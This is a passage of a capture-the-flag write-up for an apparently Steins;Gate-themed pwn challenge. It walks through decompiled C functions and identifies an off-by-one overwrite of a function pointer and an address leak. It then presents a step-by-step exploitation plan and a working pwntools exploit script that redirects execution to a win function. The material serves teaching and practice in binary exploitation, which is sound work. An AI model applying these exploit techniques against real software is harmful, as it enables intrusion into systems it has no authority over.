:(&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        okabe();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Try again.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It’s just a menu of functions that allows you to navigate to each function within the program by selecting the corresponding number, lets see each function one by one </p><h5 id="divergence-meter-func"><a href="#divergence-meter-func" class="headerlink" title="divergence_meter func"></a>divergence_meter func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">divergence_meter</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> sVar1;</span><br><span class="line">  ulong uVar2;</span><br><span class="line">  undefined8 local_2f;</span><br><span class="line">  undefined4 local_27;</span><br><span class="line">  undefined2 local_23;</span><br><span class="line">  undefined local_21;</span><br><span class="line">  <span class="type">int</span> counter;</span><br><span class="line">  <span class="type">int</span> local_1c;</span><br><span class="line">  </span><br><span class="line">  local_2f = <span class="number">0</span>;</span><br><span class="line">  local_27 = <span class="number">0</span>;</span><br><span class="line">  local_23 = <span class="number">0</span>;</span><br><span class="line">  local_21 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Choose where to leap: &quot;</span>);</span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;local_2f,<span class="number">15</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  local_1c = <span class="number">0</span>;</span><br><span class="line">  counter = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    uVar2 = SEXT48(counter);</span><br><span class="line">    sVar1 = <span class="built_in">strlen</span>((<span class="type">char</span> *)&amp;local_2f);</span><br><span class="line">    <span class="keyword">if</span> (sVar1 &lt;= uVar2) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">char</span> *)((<span class="type">long</span>)&amp;local_2f + (<span class="type">long</span>)counter) != <span class="string">&#x27;g&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((*(<span class="type">char</span> *)((<span class="type">long</span>)&amp;local_2f + (<span class="type">long</span>)counter) == <span class="string">&#x27;o&#x27;</span>) &amp;&amp; (local_1c != <span class="number">0</span>)) &#123;</span><br><span class="line">        local_1c = youdidwhat(local_1c);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        timeline[(<span class="type">long</span>)local_1c + <span class="number">16</span>] = *(undefined *)((<span class="type">long</span>)&amp;local_2f + (<span class="type">long</span>)counter);</span><br><span class="line">        local_1c = local_1c + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">8</span> &lt; local_1c) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    counter = counter + <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This function <code>divergence_meter</code> reads user input, processing characters according to conditions, and stores them in the <code>timeline</code> array.</p><p>here in this function we have BOF in the <code>fgets</code> function <strong>local_2f</strong> local variable suppose to hold 8 byte of data but more than that has permitted and content from local_2f variable being copied to <strong>timeline</strong> variable and if we see in ghidra timeline is global variable </p><p><img src="/imgs/post6/pwn/pwngate1.png" alt="pwngate1.png"></p><p><img src="/imgs/post6/pwn/pwngate2.png" alt="pwngate2.png"></p><p>that also being used in other function as well, lets follow timeleap and <code>timeleap</code> and <code>current_leap</code> </p><h5 id="current-leap-func"><a href="#current-leap-func" class="headerlink" title="current_leap func"></a>current_leap func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">current_leap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  timeline._24_8_ = fate;</span><br><span class="line">  leveling._0_4_ = <span class="number">0</span>;</span><br><span class="line">  leveling._24_8_ = <span class="number">0</span>;</span><br><span class="line">  password();</span><br><span class="line">  leveling._4_4_ = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>okay so basically timeline is structure and this function assigns the function pointer <code>fate</code> to the <code>_24_8_</code> member of the <code>timeline</code> structure. and also sets the <code>_0_4_</code> , <code>_24_8_</code> and <code>_4_4_</code> members of the <code>leveling</code> structure to <code>0</code>.</p><p>hmm so here <code>timeline._24_8_</code> is working as function pointer and A function pointer is a variable that can store the memory address of a function. In this case, the code is setting the function pointer <code>timeline._24_8_</code> to point to the <code>fate</code> function. This allows you to call the <code>fate</code> function indirectly through the function pointer <code>timeline._24_8_</code>.</p><h5 id="timeleap-func"><a href="#timeleap-func" class="headerlink" title="timeleap func"></a>timeleap func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">timeleap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You\&#x27;ve pressed the button... be ready for the leap!&quot;</span>);</span><br><span class="line">  sleep(<span class="number">0</span>);</span><br><span class="line">  (*timeline._24_8_)();</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>and that function pointer being called in this <code>timeleap</code> function that is <code>fate</code> function </p><h5 id="sanity-func"><a href="#sanity-func" class="headerlink" title="sanity func"></a>sanity func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sanity</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined4 local_ed;</span><br><span class="line">  undefined local_e9;</span><br><span class="line">  <span class="type">char</span> local_e8 [<span class="number">50</span>];</span><br><span class="line">  <span class="type">char</span> local_b6 [<span class="number">50</span>];</span><br><span class="line">  <span class="type">char</span> local_84 [<span class="number">50</span>];</span><br><span class="line">  <span class="type">char</span> local_52 [<span class="number">54</span>];</span><br><span class="line">  <span class="type">int</span> local_1c;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> local_14;</span><br><span class="line">  <span class="type">int</span> local_10;</span><br><span class="line">  uint local_c;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nI don\&#x27;t recognize you, answer some questions first.&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">  local_c = <span class="number">0</span>;</span><br><span class="line">  local_10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;------------------------------&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[1] Answer my questions&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[2] Show your answers&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[3] See your score&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[4] Return&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;------------------------------&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Choose: &quot;</span>);</span><br><span class="line">      local_ed = <span class="number">0</span>;</span><br><span class="line">      local_e9 = <span class="number">0</span>;</span><br><span class="line">      fgets((<span class="type">char</span> *)&amp;local_ed,<span class="number">5</span>,<span class="built_in">stdin</span>);</span><br><span class="line">      local_1c = atoi((<span class="type">char</span> *)&amp;local_ed);</span><br><span class="line">      <span class="keyword">if</span> (local_1c != <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">for</span> (local_14 = <span class="number">0</span>; local_14 &lt; <span class="number">2</span>; local_14 = local_14 + <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(local_e8 + (<span class="type">long</span>)local_14 * <span class="number">0x32</span>,<span class="number">0</span>,<span class="number">0x32</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;What is written on the Lab Members badge?&quot;</span>);</span><br><span class="line">      fgets(local_e8,<span class="number">0x32</span>,<span class="built_in">stdin</span>);</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(local_e8,<span class="string">&quot;OSHMKUFA 2010&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">        local_c = local_c + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;What is the name of Okabe\&#x27;s Laboratory?&quot;</span>);</span><br><span class="line">      fgets(local_b6,<span class="number">0x32</span>,<span class="built_in">stdin</span>);</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(local_b6,<span class="string">&quot;Future Gagdet Laboratory&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">        local_c = local_c + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;What is Mayuri\&#x27;s favorite hobby?&quot;</span>);</span><br><span class="line">      fgets(local_84,<span class="number">0x32</span>,<span class="built_in">stdin</span>);</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(local_84,<span class="string">&quot;Cosplay&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">        local_c = local_c + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Is Ruka a boy or girl?&quot;</span>);</span><br><span class="line">      fgets(local_52,<span class="number">0x32</span>,<span class="built_in">stdin</span>);</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(local_52,<span class="string">&quot;It depends on the timeline&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">        local_c = local_c + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      leveling._4_4_ = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I think l remember you a bit now...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((local_1c == <span class="number">2</span>) &amp;&amp; (local_10 != <span class="number">1</span>)) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (local_1c == <span class="number">3</span>) &#123;</span><br><span class="line">      local_10 = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your score is: %d \n&quot;</span>,(ulong)local_c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> ((local_1c != <span class="number">2</span>) || (local_10 != <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;These are your answers: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(local_e8 + (<span class="type">long</span>)i * <span class="number">0x32</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You didn\&#x27;t even start the game...&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>okay simple quiz game. Users answer questions, accumulating a score for incorrect responses. They can choose to answer, display answers, or check their score. Incorrect answers increase the score. The function handles input, checks answers, and provides feedback.</p><p>this function require <code>leveling._0_4_ != 0</code> BTW </p><h5 id="okabe-func"><a href="#okabe-func" class="headerlink" title="okabe func"></a>okabe func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">okabe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> local_28 [<span class="number">12</span>];</span><br><span class="line">  undefined local_1c;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What\&#x27;s the password?&quot;</span>);</span><br><span class="line">  fgets(local_28,<span class="number">20</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  local_1c = <span class="number">0</span>;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(leveling + <span class="number">8</span>,local_28);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;That\&#x27;s wrong.&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Do you still remember who you are?: &quot;</span>);</span><br><span class="line">  fgets(timeline,<span class="number">0x20</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Prompts the user to enter a password using <code>fgets</code> and stores it in the <code>local_28</code> character array check for password correction, if incorrect exit the program or else it will prompt the user to enter data that being stored on <strong>timeline</strong> variable </p><p>and remember it require <code>leveling._4_4_ != 0</code> to being called </p><p><strong>okkayy lets sum up the information we got</strong> :</p><ul><li>we have BOF in function <code>divergence_meter</code> that allows us to to write out of bound <ul><li>but things get start serious when we jump to while loop where the content of local variable <code>local_2f</code> being copied into timeline variable, it loop for 9 time and content of local_2f variable being copied to timeline one by one, as index of timeline start from 16 that is <code>timeline[(long)local_1c + 16]</code> and goes until 9 byte of write (<code>if(8&lt;local_1c)</code>) we are able to write next one byte of <code>timeline</code> i.e. <code>timeline[24]</code> and as we have seen in <code>curretn_leap</code> function this particular member of this structure is function pointer of fate function i.e. <code>timeline._24_8_ = fate;</code> so we have OBO bug here</li></ul></li><li>function <code>timeleap</code> call the function i.e. <code>(*timeline._24_8_)();</code></li><li>yet to see how function <code>sanity</code> is working or if it gives any information that can help us to pwn the binary as it is only callable if <code>leveling._0_4_ != 0</code> we have to figure it out</li><li>function <code>okabe</code> asking for password that we don’t know about so far and this func is only callable when <code>leveling._4_4_ != 0</code> as previous function</li></ul><p>so lets focus on <code>sanity</code> and <code>okabe</code> function for now how we can make it call.</p><p>okay as <code>leveling._4_4_</code> is global we can follow or cross reference where else this particular variable being used in program by double clicking on it (in ghidra)</p><p><img src="/imgs/post6/pwn/pwngate2.1.png" alt="pwngate2.1.png"></p><p>so its used in some other function also where one of them is <code>print_current_password</code> where we can see <code>leveling._0_4_ = 1</code> so this function make that particular variable value 1, so somehow we have to call this function to call <code>sanity</code> one </p><p>lets follow the parent function function of this particular one following XREF </p><p><img src="/imgs/post6/pwn/pwngate3.gif" alt="pwngate3.gif"></p><p>so <code>print_current_password -&gt; verify_number -&gt; whereami -&gt; new_fate</code> we have to call <code>new_fate</code> one </p><p>and same for <code>okabe</code></p><p><img src="/imgs/post6/pwn/pwngate4.gif" alt="pwngate4.gif"></p><p>the function we have to to call is <code>sanity</code> , we have to call <code>sanity</code> anyway </p><p>we leveraged the OBO bug to overwrite the LSB of one byte of <code>fate</code> address <code>new_fate</code> that gives us password</p><p><img src="/imgs/post6/pwn/pwngate5.png" alt="pwngate5.png"></p><p>and thus we are allowed to call <code>sanity</code> that leaks the address (see the exploit)</p><p><img src="/imgs/post6/pwn/pwngate6.png" alt="pwngate6.png"></p><p><img src="/imgs/post6/pwn/pwngate7.png" alt="pwngate7.png"></p><p><strong>Exploitation methodology</strong> :</p><ul><li>using OBO overwrite the <code>fate</code> to <code>new_fate</code> as the first byte and a half is not changed by aslr so we can hardcode the byte</li><li>call the <code>timeleap</code> function so that we can make <code>new_fate</code> call undirectly using function pointer</li><li>grab the password from <code>new_fate</code> </li><li>grab the leak from <code>sanity</code> and calculate the base </li><li>use the pass and overwrite the address of <code>timeline._24_8_</code> with <code>win</code> i.e. first 24 byte garbage and rest 8 byte address of <code>win</code> as we are allowed to write 32 byte </li><li>as we have overwritten <code>timeline._24_8_</code> we can call it using <code>timeleap</code> function</li></ul><h4 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwngate_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-2.35.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">r = conn()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">obo_fate</span>(<span class="params">obo</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Enter choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choose where to leap: &quot;</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">8</span> + pack(obo)) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">answer_questions</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choose: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        r.recvline()</span><br><span class="line">        r.sendline(<span class="string">&quot;M&quot;</span>*(<span class="number">0x30</span> - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    </span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Enter your name: &quot;</span>, <span class="string">&quot;zr0x&quot;</span>)</span><br><span class="line">    obo_fate(<span class="number">0xec</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Enter choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choose what to do: &quot;</span>, <span class="built_in">str</span>(<span class="number">0x100000000</span>))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Your password is: \n&quot;</span>)</span><br><span class="line">    password = r.recvline().strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&quot;PASS is &quot;</span> + password)</span><br><span class="line">     </span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Enter choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choose: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choose: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    r.recvline()</span><br><span class="line">    leak = u64(r.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    log.info(<span class="string">&quot;Leak &quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">    answer_questions()</span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choose: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    elf.address = leak - <span class="number">0x3d48</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Enter choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;\n&quot;</span>, password)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;are?: &quot;</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x18</span> + p64(elf.sym.win))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Enter choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h3><h5 id="main-func-3"><a href="#main-func-3" class="headerlink" title="main func"></a>main func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined8 uVar1;</span><br><span class="line">  <span class="type">int</span> local_6c;</span><br><span class="line">  undefined local_68 [<span class="number">16</span>];</span><br><span class="line">  undefined local_58 [<span class="number">16</span>];</span><br><span class="line">  undefined local_48 [<span class="number">16</span>];</span><br><span class="line">  undefined local_38 [<span class="number">16</span>];</span><br><span class="line">  undefined local_28 [<span class="number">16</span>];</span><br><span class="line">  <span class="type">int</span> local_10;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,(<span class="type">char</span> *)<span 